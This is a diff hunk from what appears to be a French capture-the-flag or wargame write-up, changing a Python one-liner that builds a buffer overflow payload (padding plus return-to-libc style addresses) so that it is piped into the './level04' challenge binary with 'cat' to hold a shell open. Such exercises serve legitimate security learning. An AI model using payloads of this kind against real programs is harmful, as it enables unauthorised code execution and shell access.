@@ -239,7 +239,7 @@ Non-debugging symbols:
 
 
 ```bash
-python -c 'print b"A"*156 + b"\xf7\xe6\xae\xd0"[::-1] + b"\xf7\xee\x45\xc4"[::-1] + b"\xf7\xf8\x97\xec"[::-1]' > /tmp/payload
+(python -c 'print b"A"*156 + b"\xf7\xe6\xae\xd0"[::-1] + b"\xf7\xee\x45\xc4"[::-1] + b"\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
 ```
 
 Essayons le !
